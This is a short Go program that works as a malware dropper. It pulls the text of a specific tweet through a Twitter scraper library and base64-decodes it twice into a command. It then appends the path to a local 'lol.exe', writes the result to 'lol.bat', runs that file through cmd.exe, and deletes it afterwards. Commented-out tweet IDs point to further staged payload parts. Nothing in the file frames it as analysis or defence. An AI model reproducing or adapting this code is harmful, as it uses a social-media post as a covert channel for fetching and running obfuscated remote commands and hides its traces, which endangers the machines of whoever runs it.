package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"

	twt_get "github.com/n0madic/twitter-scraper"
)

func hErr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	srcd, err := os.Getwd()
	src := srcd + "\\lol.exe"
	hErr(err)
	dev(src)
}

func dev(src string) {
	/*
		p1 := "1403966516484218889"
		p2 := "1403966607064387587"
		p3 := "1403966702526754816"
		p4 := "1403966781438369800"
	*/
	scraper := twt_get.New()

	tweet, err := scraper.GetTweet("1403966516484218889")
	hErr(err)
	p1_1, err := base64.StdEncoding.DecodeString(tweet.Text)
	hErr(err)
	p1_1_1, err := base64.StdEncoding.DecodeString(string(p1_1))
	hErr(err)
	pld1 := string(p1_1_1) + src
	fmt.Println(pld1)
	mk(pld1)
}

func mk(pld string) {
	newFile, err := os.Create("lol.bat")
	hErr(err)
	newFile.Close()

	ioutil.WriteFile("lol.bat", []byte(pld+"\nexit"), 0755)
	hErr(err)

	srcd, err := os.Getwd()
	src := srcd + "\\lol.bat"
	fmt.Println(src)
	hErr(err)
	exec.Command("cmd.exe", "/C", "Start "+src).Output()

	fmt.Println(src)
	err = os.Remove(src)
	hErr(err)
}
